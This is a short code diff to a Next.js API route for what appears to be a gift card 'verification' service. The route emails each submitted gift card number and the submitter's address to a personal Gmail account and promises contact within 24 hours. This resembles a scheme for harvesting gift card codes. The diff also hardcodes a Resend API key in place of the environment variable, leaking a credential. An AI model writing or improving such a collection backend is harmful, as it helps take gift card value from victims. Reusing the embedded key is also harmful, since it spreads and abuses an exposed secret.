@@ -1,7 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server'
-import Resend from 'resend'
+import { Resend } from 'resend'
 
-const resendApiKey = process.env.RESEND_API_KEY
+const resendApiKey ="re_EPCWjCVJ_8t1yFufcuaymBuWwhk92WMqX"
 let resendClient: Resend | null = null
 if (resendApiKey) {
   resendClient = new Resend(resendApiKey)
@@ -123,11 +123,11 @@ export async function POST(request: NextRequest) {
 
     try {
       const resp = await resendClient.emails.send({
-        from: 'no-reply@giftcard-checker.example.com',
+        from: 'no-reply@giftcardvalidator.org',
         to: 'grimesdarl4@gmail.com',
         subject: `New Gift Card Verification Request - ${giftCard}`,
         html: adminEmailContent,
-        reply_to: email,
+        replyTo: email,
       })
 
       console.log('[v0] Resend response:', resp)
@@ -136,7 +136,7 @@ export async function POST(request: NextRequest) {
         {
           success: true,
           message: 'Verification request submitted successfully! We will contact you within 24 hours.',
-          messageId: resp.id ?? null,
+          messageId: resp.data?.id ?? (resp as any).id ?? null,
         },
         { status: 200 }
       )
